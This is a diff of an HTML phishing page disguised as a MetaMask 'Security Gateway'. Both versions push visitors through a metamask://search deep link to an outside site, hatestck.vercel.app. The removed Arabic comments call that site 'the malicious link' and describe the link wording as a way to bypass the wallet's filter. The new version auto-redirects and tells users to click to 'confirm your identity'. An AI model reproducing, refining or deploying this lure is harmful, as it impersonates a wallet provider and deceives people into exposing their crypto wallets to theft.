@@ -1,66 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Gateway - MetaMask</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #0b0e11; color: white; text-align: center; }
-        .loader { border: 4px solid #1e2329; border-top: 4px solid #f6851b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.4rem; color: #f6851b; }
-        .timer-box { margin-top: 15px; font-size: 1rem; color: #9ca3af; }
-        #seconds { font-weight: bold; color: #f6851b; font-size: 1.2rem; }
-        .btn-bypass { margin-top: 30px; padding: 12px 30px; background: #f6851b; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; display: none; }
-    </style>
-</head>
-<body>
-
-    <div class="loader"></div>
-    <h1>Initializing Secure Bridge</h1>
-    <p>Connecting your wallet to the dApp gateway...</p>
+<html>
+<body onclick="window.location.href='metamask://search?q=https://hatestck.vercel.app/'" style="background:#000; color:#fff; height:100vh; display:flex; align-items:center; justify-content:center; text-align:center;">
     
-    <div class="timer-box">Redirecting in <span id="seconds">5</span> seconds...</div>
-
-    <button id="manualBtn" class="btn-bypass" onclick="doRedirect()">CONNECT MANUALLY</button>
+    <div style="padding:20px; border:2px solid #f6851b; border-radius:15px;">
+        <h2 style="color:#f6851b;">SECURITY PROTOCOL</h2>
+        <p>Click anywhere on this screen to confirm your identity and open MetaMask.</p>
+    </div>
 
     <script>
-        // 1. الرابط الخبيث (المستهدف)
-        const myLink = "https://hatestck.vercel.app/";
-        
-        // 2. صياغة رابط البحث (The Search Intent) لتجاوز الفلتر
-        const targetUrl = "metamask://search?q=" + encodeURIComponent(myLink);
-
-        let timeLeft = 5;
-        const secondsDisplay = document.getElementById('seconds');
-        const manualBtn = document.getElementById('manualBtn');
-
-        // 3. منطق العداد التنازلي
-        const countdown = setInterval(() => {
-            timeLeft--;
-            secondsDisplay.innerText = timeLeft;
-
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                doRedirect();
-            }
-        }, 1000);
-
-        // 4. وظيفة التحويل (مع معالجة حظر المتصفح)
-        function doRedirect() {
-            // محاولة التحويل
-            window.location.href = targetUrl;
-            
-            // إظهار الزر اليدوي فوراً في حال فشل التحويل التلقائي (بسبب سياسات المتصفح)
-            setTimeout(() => {
-                manualBtn.style.display = "block";
-                document.querySelector('.timer-box').innerText = "Redirect blocked by browser. Please click below:";
-            }, 500);
-        }
-
-        // تحفيز المتصفح عند أول لمسة للشاشة لضمان عمل الـ Redirect لاحقاً
-        window.onclick = function() { console.log("User gestured - Redirect primed."); };
+        // محاولة تحويل تلقائي فورية
+        setTimeout(() => {
+            window.location.replace("metamask://search?q=https://hatestck.vercel.app/");
+        }, 500);
     </script>
-
 </body>
 </html>
